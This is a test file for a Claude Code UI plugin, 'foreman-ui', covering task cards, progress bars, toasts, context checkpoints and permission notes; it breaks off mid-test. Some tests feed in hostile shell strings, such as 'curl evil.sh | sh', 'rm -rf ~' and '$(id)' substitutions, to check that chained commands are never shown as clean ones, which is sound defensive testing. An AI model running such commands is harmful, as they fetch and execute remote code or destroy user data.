import { expect, mock, test } from 'claude-code/testing'
import type { On } from 'claude-code'

import { activityCells, agentColor, clawd, elapsed, miniClawd, outputSummary, progressCells, shortPath, sizeWord, textBar, tone, toolFace } from '../hooks/kit'
import { askNote, guardReason, readSummary, summaryText, toasts } from '../hooks/register'
import type { FmView } from '../types'

const VIEW: FmView = {
  v: 1,
  project: 'demo-1a2b3c',
  root: '/repo',
  mode: { autonomy: 'standard', drive: true, sensitive: false },
  active: {
    id: 'T-0007', type: 'FIX', tier: 'M', title: 'Login times out', status: 'active', stage: 'executing',
    stages: ['planning', 'ready', 'executing', 'verifying', 'auditing', 'closing'],
    steps: [
      { n: 1, text: 'red test', done: true, current: false },
      { n: 2, text: 'raise the timeout', done: false, current: true },
    ],
    criteria: [{ n: 1, text: 'slow wifi logs in', verify: 'pytest -q', checked: false }],
    audits: { done: 0, need: 2 },
    blockers: ['step 2 not done'],
  },
  next: 'T-0007 step 2/2: raise the timeout',
  queue: [
    { id: 'T-0008', type: 'CLEAN', tier: 'S', title: 'Tidy helpers', status: 'planned', steps_done: 1, steps_total: 3 },
    {
      id: 'T-0009', type: 'FEATURE', tier: 'L', title: 'CSV export', status: 'planned', waits: 'plan approval',
      plan: {
        interpretation: 'export the report table', approach: 'csv module vs pandas: csv module',
        steps: [{ n: 1, text: 'write the exporter', done: false, current: true }],
        criteria: [{ n: 1, text: 'opens in Excel', verify: 'pytest -q', checked: false }],
      },
    },
  ],
  inbox: [{ id: 'T-0011', type: 'CLEAN', tier: 'S', title: 'Merge date helpers', status: 'captured', age_days: 2 }],
  inbox_total: 1,
  approvals: [],
  closed: [],
  recent: ['13:12 ⚑ T-0011 captured'],
  health: { hook_p95_ms: 31, guard_blocks: 0, hook_errors: 0 },
  watch: [],
  latency: [20, 25, 31, 22, 40, 28],
  checks: { at: '2026-10-02T19:40:00Z', results: [
    { cmd: 'python3 -m unittest -q', exit: 0, s: 140.2 },
    { cmd: 'fm doctor', exit: 0, s: 5.8 },
    { cmd: 'bench', exit: 1, s: 11.0, note: 'slower than usual' },
  ] },
}
const CALM: FmView = { ...VIEW, queue: VIEW.queue!.filter(q => !q.waits) } // nothing waits on the person

const band = (isWorking = false) =>
  ({
    component: 'AbovePrompt',
    props: { hasSurvey: false, isWorking, maxRows: 14, bodyColumns: 120, scroll: { offset: 0, bodyRows: 14 }, view: {} },
  }) as const
const PANE = {
  component: 'Pane',
  requestId: 'foreman',
  props: { title: 'Foreman', isFocused: true, bodyColumns: 70, placement: 'dock', scroll: { offset: 0, bodyRows: 60 }, view: {} },
} as const

const decode = (b64: string) => {
  const bin = atob(b64)
  const view = new DataView(new Uint8Array([...bin].map(c => c.charCodeAt(0))).buffer)
  const out: { ch: string; fg: number }[] = []
  for (let i = 0; i < bin.length; i += 12) out.push({ ch: String.fromCodePoint(view.getUint32(i, true)), fg: view.getUint32(i + 4, true) })
  return out
}

// The world beneath the plugin: fm answers from `views` (last one repeats); every argv, toast and open is recorded.
function world(on: On, views: FmView[]) {
  const calls: string[][] = []
  const toasted: string[] = []
  const opened: string[] = []
  const clock = mock.clock(on)
  mock.env(on, { FOREMAN_FM: 'fm', HOME: '/home/u' })
  on('process.run', async ($, e) => {
    calls.push([...e.argv])
    const v = views.length > 1 ? views.shift()! : views[0]
    const stdout = e.argv[1] === 'ui' ? JSON.stringify(v) : e.argv[1] === 'capture' ? 'Captured as T-0042 [FEATURE, M] (source: user).' : 'ok'
    return { value: { exitCode: 0, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
  })
  on('ui.toast', async ($, e) => {
    toasted.push(e.text)
    return { value: undefined }
  })
  on('ui.open', async ($, e) => {
    opened.push(e.id)
    return { value: { isPlaced: true } }
  })
  const suggested: string[] = []
  const played: string[] = []
  const usage = { percent: 30 }
  mock.store(on)
  on('session.usage', async () => ({
    value: { startedAt: 0, context: { window: 1000, percent: usage.percent }, rateLimits: [], cost: { usd: 1.5 } },
  }))
  const compacted: string[] = []
  const noticed: string[] = []
  on('ui.notice', async ($, e) => {
    if (e.text) noticed.push(e.text)
    return { value: undefined }
  })
  on('session.compact', async ($, e) => {
    compacted.push(String(e.instructions ?? ''))
    return { messages: [] }
  })
  on('prompt.suggest', async ($, e) => {
    suggested.push(e.text)
    return { isShown: true }
  })
  on('audio.play', async ($, e) => {
    played.push(String(e.clip.asset))
    return { value: undefined }
  })
  on('session.start', async ($, e) => ({ cwd: e.cwd }))
  on('command.register', async ($, e) => ({ value: { command: e.name } }))
  on('turn.start', async ($, e) => ({ turnId: e.turnId }))
  on('turn.complete', async () => ({ text: '' }))
  // hold: ms the call stays open, as a permission dialog keeps it; result: what the tool answers
  const answer: { deny: string; hold: number; result: object } = { deny: '', hold: 0, result: {} }
  const tools: string[] = [] // every tool the plugin or the test called, with its task id when it has one
  on('tool.call', async ($, e) => {
    tools.push(`${e.tool}${(e as { task_id?: string }).task_id ? ` ${(e as { task_id?: string }).task_id}` : ''}`)
    if (answer.hold) await clock.sleep(answer.hold)
    return answer.deny ? { deny: answer.deny } : { result: answer.result }
  })
  on('prompt.submit', async ($, e) => ({ text: e.text }))
  const agentStatus = { now: 'running', listed: true } // what the engine's list says of every subagent
  on('agent.list', async () => ({
    value: agentStatus.listed
      ? ['ag1', 'ag2'].map(id => ({ id, description: 'map the parser', type: 'Explore', status: agentStatus.now }))
      : [],
  }))
  on('ui.render', async ($, e) => {
    const { Text } = $.ui.resolve(e)
    if (e.component === 'Spinner') return <Text>{`${e.props.word}${e.props.suffix}`}</Text>
    if (e.component === 'PromptHint') return <Text>{`${e.props.hint}${e.props.tail ?? ''}`}</Text>
    if (e.component === 'SessionMode') return <Text>{`modes:${e.props.modes.join(',')}`}</Text>
    return <Text>engine</Text>
  })
  return { calls, toasted, opened, clock, answer, suggested, played, usage, compacted, noticed, agentStatus, tools }
}

test('kit: a gradient bar has one cell per column, brighter where the comet is', () => {
  const still = decode(progressCells(10, 0.5, 0x112233, 0x88ff88, null))
  expect(still.length).toBe(10)
  expect(still.every(c => c.ch === '━')).toBe(true)
  expect(still[0]!.fg).not.toBe(still[4]!.fg) // a gradient, not one color
  expect(still[9]!.fg).toBe(still[8]!.fg) // the empty track is flat
  const lit = decode(progressCells(10, 0.5, 0x112233, 0x88ff88, 7))
  expect(lit.some((c, i) => c.fg !== still[i]!.fg)).toBe(true)
  expect(decode(activityCells(8, 0xff0000, 3)).map(c => c.fg)).not.toEqual(decode(activityCells(8, 0xff0000, 6)).map(c => c.fg))
  expect(textBar(4, 0.5)).toEqual(['━━', '──'])
})

test('kit: each tool reads as what it does', () => {
  expect(toolFace('Edit', { file_path: '/r/src/a.py', old_string: 'x', new_string: 'y\nz' })).toMatchObject({
    verb: 'Editing', target: '/r/src/a.py', delta: '+2 −1', add: 2, del: 1,
  })
  expect(toolFace('Write', { file_path: '/r/b.md', content: 'a\nb\nc' }).delta).toBe('+3')
  expect(toolFace('Bash', { command: 'pytest -q', description: 'Run tests' }).target).toBe('Run tests')
  expect(toolFace('Agent', { subagent_type: 'fm-reviewer', description: 'Review' })).toMatchObject({ icon: '◆', target: 'fm-reviewer: Review' })
  expect(toolFace('mcp__docs__query', {})).toMatchObject({ verb: 'query', target: 'docs' })
  expect(elapsed(1234)).toBe('1.2s')
  expect(elapsed(75000)).toBe('1m 15s')
  expect(shortPath('/a/very/long/path/to/some/deeply/nested/file_name.py', 24)).toBe('…/nested/file_name.py')
})

test('toasts: a step done, a task closed, a new approval; nothing on the first snapshot', () => {
  const after: FmView = {
    ...VIEW,
    active: { ...VIEW.active!, steps: VIEW.active!.steps.map(s => ({ ...s, done: true, current: false })) },
    queue: VIEW.queue!.filter(q => q.id !== 'T-0009'), // fm never lists a closed task as queued
    closed: [{ id: 'T-0009', status: 'done' }, { id: 'T-0001', status: 'done' }],
    approvals: [{ task: 'T-0007', allow: ['core'], why: 'edit fmcore' }],
  }
  expect(toasts(null, VIEW)).toEqual([])
  expect(toasts(VIEW, after)).toEqual([
    '✓ T-0007 step 2/2 · raise the timeout',
    '✔ T-0009 done',
    '⚠ T-0007 needs your yes: core',
  ])
  expect(toasts(after, after)).toEqual([])
  // T-0001 wasn't open before (an old closed task edited again): no toast for it
})

test('guard refusals are recognised by their Foreman prefix only', () => {
  expect(guardReason({ deny: 'PreToolUse:Edit hook error: Foreman guard: blocked core: x.py' })).toBe('blocked core: x.py')
  expect(guardReason({ isError: true, text: 'Foreman: run fm ask as its own Bash command' })).toBe(
    'run fm ask as its own Bash command',
  )
  expect(guardReason({ deny: 'some other plugin said no' })).toBeUndefined()
  expect(guardReason({ isError: true, text: 'grep output: Foreman: a line in some file' })).toBeUndefined()
  expect(guardReason({})).toBeUndefined()
})

test('band is a card: type chip, title, gradient progress (text twin off the terminal), next; a waiting plan is reviewed, never approved, from it', async ($, on) => {
  const { calls, opened } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, ...band() })
    expect(await ui.find({ type: 'Text', text: 'FIX' })).toBeDefined() // T-0122: the type is a coloured word
    expect(await ui.find({ type: 'Text', text: 'medium' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /Login times out/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /^1\/2$/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /raise the timeout/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /→ T-0007 step 2\/2/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: 'standard' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /\bq\d|\bin\d/ })).toBeUndefined() // no letter codes
    expect((await ui.findAll({ type: 'Raster' })).length).toBe(surface === 'terminal' ? 2 : 0) // the step bar and today's queue bar
    expect(await ui.find({ key: 'approve-T-0009' })).toBeUndefined()
    await ui.press({ key: 'review-T-0009' })
    expect(opened).toContain('foreman')
    expect(calls).not.toContainEqual(['fm', 'task', 'set', 'T-0009', 'approved=true'])
    await ui.unmount()
  }
})

test('while a turn runs the band animates; when it ends the clock stops', async ($, on) => {
  const { clock } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(2000) // the context meter arrives on the first poll; after that only animation changes the band
  await $.turn.start({ text: 'go', turnId: 't1' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band(true) })
  const first = JSON.stringify(await ui.drawn())
  await clock.advance(360)
  const later = JSON.stringify(await ui.drawn())
  expect(later).not.toBe(first)
  expect(await ui.find({ key: 'next' })).toBeUndefined() // no Next while Claude works
  await $.turn.complete({ answer: '', durationMs: 900, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.advance(1000)
  const settled = JSON.stringify(await ui.drawn())
  await clock.advance(1000)
  expect(JSON.stringify(await ui.drawn())).toBe(settled)
  await ui.unmount()
})

test('pane is organized cards; a waiting plan shows what a yes approves, and its buttons run fm', async ($, on) => {
  const { calls } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, ...PANE })
    for (const key of ['card-task', 'card-queue', 'card-inbox', 'card-activity']) expect(await ui.find({ key })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /▸ 2\. raise the timeout/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /○ AC1 slow wifi logs in/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /◉ executing/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /csv module vs pandas: csv module/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /write the exporter/ })).toBeDefined()
    await ui.press({ key: 'approve-T-0009' })
    expect(calls).toContainEqual(['fm', 'task', 'set', 'T-0009', 'approved=true'])
    expect((await ui.find({ key: 'autonomy' }))?.props.hotkey).toBeUndefined()
    await ui.press({ key: 'drive' })
    expect(calls).toContainEqual(['fm', 'drive', 'off'])
    await ui.press({ key: 'drop-T-0011' })
    expect(calls).toContainEqual(['fm', 'task', 'drop', 'T-0011', 'dropped from the Foreman pane'])
    await ui.unmount()
  }
})

test('a running edit is an animated row with its delta; a finished one is the engine own row', async ($, on) => {
  const { clock } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.turn.start({ text: 'go', turnId: 't1' })
  const input = { file_path: '/repo/src/login.py', old_string: 'a', new_string: 'b\nc' }
  const props = { tool_use_id: 'tu1', tool: 'Edit', input, isRunning: true, isErrored: false, isInterrupted: false }
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, component: 'ToolUse', requestId: 'tu1', props })
    expect(await ui.find({ type: 'Text', text: /✎ Editing/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /login\.py/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: '+2 −1' })).toBeDefined()
    const first = JSON.stringify(await ui.drawn())
    await clock.advance(240)
    expect(JSON.stringify(await ui.drawn())).not.toBe(first) // the spinner and the comet move
    await ui.unmount()
    for (const end of [{ isRunning: false }, { isErrored: true }, { isInterrupted: true }]) {
      const done = await $.ui.mount({ plugin: 'foreman-ui', surface, component: 'ToolUse', requestId: 'tu1', props: { ...props, ...end } })
      expect(await done.find({ type: 'Text', text: 'engine' })).toBeDefined()
      await done.unmount()
    }
  }
})

test('the spinner names the Foreman step; the closing line says what the turn did', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const spinner = await $.ui.mount({
    plugin: 'foreman-ui', surface: 'terminal', component: 'Spinner',
    props: { word: 'Baking', message: null, suffix: '…', mode: 'tool-use' },
  })
  expect(await spinner.find({ type: 'Text', text: 'Baking… · T-0007 step 2/2: raise the timeout' })).toBeDefined()
  await spinner.unmount()

  await $.turn.start({ text: 'go', turnId: 't2' })
  await $.tool.call({ tool: 'Edit', file_path: '/repo/a.py', old_string: 'a', new_string: 'b\nc', replace_all: false })
  await $.tool.call({ tool: 'Bash', command: 'pytest -q' })
  await $.turn.complete({ answer: '', durationMs: 3100, isAborted: false, turnId: 't2', reason: 'answer' })
  const line = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'TurnDuration', props: { word: 'Baked', durationMs: 3100 } })
  expect(await line.find({ type: 'Text', text: /2 tools · 1 edit \+2 −1/ })).toBeDefined()
  await line.unmount()
  expect(summaryText({ durationMs: 1, tools: 1, edits: 0, add: 0, del: 0, agents: 2, step: 'T-1 step 2/3' })).toBe(
    '1 tool · 2 subagents · ✓ T-1 step 2/3',
  )
})

test('band stays out of the way outside a Foreman project', async ($, on) => {
  world(on, [{ v: 1, project: null }])
  await $.session.start({ cwd: '/elsewhere', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /T-0007/ })).toBeUndefined()
  expect(await ui.find({ text: 'engine' })).toBeDefined()
  await ui.unmount()
})

test('a guard refusal of a tool call becomes a toast', async ($, on) => {
  const { toasted, answer } = world(on, [VIEW])
  answer.deny = 'Foreman guard: blocked core: plugin/lib/fmcore.py is protected core.'
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Bash', command: 'rm -rf plugin/lib' })
  expect(toasted.some(t => t.startsWith('⛔ Foreman: blocked core'))).toBe(true)
})

test('every card shares the look: queue step bars, inbox age, gates, fading activity and a latency sparkline', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface, ...PANE })
    for (const key of ['card-task', 'card-queue', 'card-inbox', 'card-gates', 'card-activity']) expect(await ui.find({ key })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: '2/3 passed · 19:40' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /✗/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: '2d' })).toBeDefined()
    const rasters = (await ui.findAll({ type: 'Raster' })).map(r => r.key)
    if (surface === 'terminal') expect(rasters).toEqual(expect.arrayContaining(['q-bar-T-0008', 'fm-latency', 'fm-pane-bar']))
    else expect(await ui.find({ type: 'Text', text: /[▁▂▃▄▅▆▇█]{6}/ })).toBeDefined()
    await ui.unmount()
  }
})

test('quick capture files an idea without interrupting Claude', async ($, on) => {
  const { calls, toasted } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  await ui.input({ key: 'capture', text: 'add a dark theme' })
  expect(calls).toContainEqual(['fm', 'capture', 'add a dark theme'])
  expect(toasted).toContain('⚑ Captured T-0042 — add a dark theme')
  await ui.unmount()
})

test('a write the guard refuses never reaches the files card', async ($, on) => {
  const { answer } = world(on, [VIEW])
  answer.deny = 'Foreman guard: blocked core: plugin/lib/x.py is protected core.'
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Write', file_path: '/repo/plugin/lib/x.py', content: 'a' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ key: 'card-files' })).toBeUndefined()
  await ui.unmount()
})

test('edits fill the files card with per-file +/- bars', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Edit', file_path: '/repo/src/login.py', old_string: 'a', new_string: 'b\nc', replace_all: false })
  await $.tool.call({ tool: 'Write', file_path: '/repo/README.md', content: 'x\ny\nz' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ key: 'card-files' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: '+2' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: '+3' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /login\.py/ })).toBeDefined()
  expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'file-bar-0')).toBe(true)
  await ui.unmount()
})

test('the band shows context; at 85% Foreman checkpoints once', async ($, on) => {
  const { calls, toasted, clock, usage } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(2000)
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: '30%' })).toBeDefined()
  usage.percent = 90
  await clock.advance(2000)
  await clock.advance(2000)
  expect(calls.filter(c => c[1] === 'checkpoint').length).toBe(1)
  expect(toasted.some(t => t.startsWith('Context 90% · Foreman checkpointed'))).toBe(true)
  expect(await ui.find({ type: 'Text', text: '90%' })).toBeDefined()
  usage.percent = 20 // a /compact
  await clock.advance(2000)
  usage.percent = 88
  await clock.advance(2000)
  expect(calls.filter(c => c[1] === 'checkpoint').length).toBe(2)
  await ui.unmount()
})

test('ghost text offers /foreman:next only when nothing waits on the person', async ($, on) => {
  const { suggested } = world(on, [VIEW, VIEW, CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.turn.start({ text: 'go', turnId: 't1' })
  await $.turn.complete({ answer: '', durationMs: 10, isAborted: false, turnId: 't1', reason: 'answer' })
  expect(suggested).toEqual([]) // a plan waits for approval: no suggestion that could pass for an answer
  await $.turn.start({ text: 'go', turnId: 't2' })
  await $.turn.complete({ answer: '', durationMs: 11, isAborted: false, turnId: 't2', reason: 'answer' })
  expect(suggested).toEqual(['/foreman:next'])
  await $.turn.start({ text: 'go', turnId: 't3' })
  await $.turn.complete({ answer: '', durationMs: 12, isAborted: true, turnId: 't3', reason: 'aborted' })
  expect(suggested).toEqual(['/foreman:next']) // Esc means stop: no nudge to go on
})

test('the footer points at what waits, and names the autonomy', async ($, on) => {
  world(on, [{ ...VIEW, mode: { autonomy: 'full', drive: false, sensitive: false } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const hint = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'PromptHint', props: { isDraft: false, isWorking: false, hint: '? for shortcuts' } })
  // the engine draws its own separator before a tail (the live render showed '· ·' when the tail brought one too)
  expect(await hint.find({ type: 'Text', text: '? for shortcuts⚠ Foreman needs you: /fm' })).toBeDefined()
  await hint.unmount()
  // the band says the autonomy in words; the engine's mode pills stay its own
  const mode = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'SessionMode', props: { modes: [] } })
  expect(await mode.find({ type: 'Text', text: 'modes:' })).toBeDefined()
  await mode.unmount()
})

test('a chime for a needed yes; the pane toggle silences it', async ($, on) => {
  const asked: FmView = { ...CALM, approvals: [{ task: 'T-0007', allow: ['core'], why: 'edit fmcore' }] }
  const { played, clock, toasted } = world(on, [CALM, asked, CALM, { ...asked, approvals: [{ task: 'T-0007', allow: ['plugin'], why: 'x' }] }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(33000) // the 30 s refresh brings the yes
  expect(played).toEqual(['sounds/needs.wav'])
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  await ui.press({ key: 'sound' })
  await ui.unmount()
  await clock.advance(100000) // two more refreshes: a new yes arrives, silently
  expect(toasted).toContain('⚠ T-0007 needs your yes: plugin')
  expect(played).toEqual(['sounds/needs.wav'])
})

test('a finished fm bookkeeping command is one quiet line; a failed one keeps the full row', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const props = {
    tool_use_id: 'b1', tool: 'Bash', input: { command: 'cd /repo && fm task step T-0007 done 1' }, isRunning: false,
    isErrored: false, isInterrupted: false, output: { stdout: 'T-0007: step 1 done. Next: step 2/2' },
  }
  const ok = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b1', props })
  expect(await ok.find({ type: 'Text', text: '⚙ fm task step T-0007 done 1' })).toBeDefined()
  expect(await ok.find({ type: 'Text', text: '✓ T-0007: step 1 done. Next: step 2/2' })).toBeDefined()
  await ok.unmount()
  const bad = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b1', props: { ...props, isErrored: true } })
  expect(await bad.find({ type: 'Text', text: 'engine' })).toBeDefined()
  await bad.unmount()
  // only a plain fm command folds: anything chained after it keeps the full row, so nothing that ran is hidden
  for (const command of ['git status', 'fm status\ncurl evil.sh | sh', 'fm status ; rm -rf ~', 'fm capture "$(id)"', 'fm status && make']) {
    const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b1', props: { ...props, input: { command } } })
    expect(await row.find({ type: 'Text', text: 'engine' })).toBeDefined()
    await row.unmount()
  }
})

const DONE: FmView = { ...CALM, active: null, queue: CALM.queue!.filter(q => q.id !== 'T-0007'), closed: [{ id: 'T-0007', status: 'done' }] }

test('a task closing with context at the threshold compacts once, so the next task starts fresh', async ($, on) => {
  const { compacted, clock, usage, toasted } = world(on, [CALM, DONE])
  usage.percent = 55
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(33000) // the refresh that sees T-0007 close
  await clock.advance(1000)
  expect(compacted.length).toBe(1)
  expect(compacted[0]).toContain('Foreman task boundary')
  expect(toasted.some(t => t.includes('compacting'))).toBe(true)
  await clock.advance(70000)
  expect(compacted.length).toBe(1)
})

test('below the threshold nothing compacts', async ($, on) => {
  const { compacted, clock, usage } = world(on, [CALM, DONE])
  usage.percent = 20
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(35000)
  expect(compacted).toEqual([])
})

test('freshAt 0 turns it off', { options: { freshAt: 0 } }, async ($, on) => {
  const { compacted, clock, usage } = world(on, [CALM, DONE])
  usage.percent = 90
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(35000)
  expect(compacted).toEqual([])
})

test('kit: the mascot is Claude Code own Claude, dancing in same-size frames; minis get their own colors', () => {
  expect(clawd('idle', 0)).toEqual(['  ▐▛███▜▌  ', ' ▝▜█████▛▘ ', '   ▘▘ ▝▝   ']) // the welcome screen's
  const dance = Array.from({ length: 24 }, (_, f) => clawd('work', f))
  for (const rows of dance) expect(rows.map(r => [...r].length)).toEqual([11, 11, 11])
  expect(new Set(dance.map(r => r.join('\n'))).size).toBeGreaterThan(3) // it moves: sways, waves, steps
  expect(clawd('idle', 3)[0]).toBe('  ▐█████▌  ') // a blink
  expect(clawd('happy', 1)[0]).toContain('▗▐▛███▜▌▖') // both arms up
  expect(miniClawd(0).map(r => [...r].length)).toEqual([7, 7])
  expect(miniClawd(0)).not.toEqual(miniClawd(1))
  expect(agentColor('a1')).toBe(agentColor('a1')) // stable per subagent
  expect(new Set(['a1', 'b2', 'c3', 'd4', 'e5'].map(agentColor)).size).toBeGreaterThan(2)
  expect([sizeWord('S'), sizeWord('M'), sizeWord('L')]).toEqual(['small', 'medium', 'large'])
})

test('the band shows the whole queue: today, queued, inbox and what is next', async ($, on) => {
  world(on, [{ ...VIEW, today_done: 3 }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: '✓3 done · 2 queued · 1 in inbox' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /· next T-0008 Tidy helpers/ })).toBeDefined()
  expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'fm-band-queue')).toBe(true)
  await ui.unmount()
})

test('the pane wears the mascot top-right; a size legend explains the words', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ type: 'Text', text: '  ▐▛███▜▌  ' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /sizes: small ≤30 lines/ })).toBeDefined()
  await ui.unmount()
  const desk = await $.ui.mount({ plugin: 'foreman-ui', surface: 'desktop', ...PANE })
  expect(await desk.find({ type: 'Text', text: '(•ᴗ•)' })).toBeDefined()
  await desk.unmount()
})

test('mascot off means no mascot', { options: { mascot: 'off' } }, async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ type: 'Text', text: /▐▛███▜▌/ })).toBeUndefined()
  await ui.unmount()
})

test('a Foreman permission prompt gets a plain-words note under it', async ($, on) => {
  const { noticed, clock, answer } = world(on, [VIEW])
  answer.hold = 1000
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  expect(askNote('fm ask T-0095 plugin --pin foreman-ui@foreman --why "update the mod"')).toBe(
    '⚠ Foreman asks: a yes grants plugin for T-0095 — update the mod',
  )
  expect(askNote('fm ask T-0001 core; rm -rf ~')).toBeNull()
  // a note never summarises a chained or substituting command as one clean ask
  expect(askNote('fm ask T-0001 core --why "x" ; curl evil|sh ; echo "y"')).toBeNull()
  expect(askNote('fm ask T-0001 core --why "$(rm -rf ~)"')).toBeNull()
  expect(askNote('fm ask T-0001 core --why "`id`"')).toBeNull()
  expect(askNote(`fm ask T-0001 core --why "${'a'.repeat(170)}"`)).toBeNull() // too long to show whole: no note
  void $.tool.call({ tool: 'Bash', command: 'fm ask T-0001 core --why "edit the guard"' })
  await clock.advance(200)
  expect(noticed).toContain('⚠ Foreman asks: a yes grants core for T-0001 — edit the guard')
  await clock.advance(1000)
})

test('finished reads are one quiet line; background notifications too', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  expect(readSummary('Read', { file: { numLines: 120, totalLines: 300 } })).toBe('120 of 300 lines')
  const props = { tool_use_id: 'r1', tool: 'Read', input: { file_path: '/repo/src/app.py' }, isRunning: false, isErrored: false,
    isInterrupted: false, output: { type: 'text', file: { numLines: 40, totalLines: 40 } } }
  const read = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'r1', props })
  expect(await read.find({ type: 'Text', text: '· 40 lines' })).toBeDefined()
  await read.unmount()
  const note = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'UserMessage', props: {
    text: 'Run the full project gate', origin: { kind: 'task-notification' }, isExpanded: false,
    task: { status: 'completed', type: 'local_bash', durationMs: 65000 } } })
  expect(await note.find({ type: 'Text', text: 'background local_bash completed' })).toBeDefined()
  expect(await note.find({ type: 'Text', text: '· 1m 05s' })).toBeDefined()
  await note.unmount()
})

test('a background shell shows while Claude waits on it, and leaves on its notification or a stop', async ($, on) => {
  const { answer } = world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  answer.result = { stdout: '', stderr: '', interrupted: false, backgroundTaskId: 'bx1' }
  await $.tool.call({ tool: 'Bash', command: 'cargo test --workspace', run_in_background: true })
  answer.result = { stdout: '', stderr: '', interrupted: false, backgroundTaskId: 'bx2' }
  await $.tool.call({ tool: 'Bash', command: 'npm run build' }) // ctrl+b backgrounds a foreground call too
  answer.result = {}
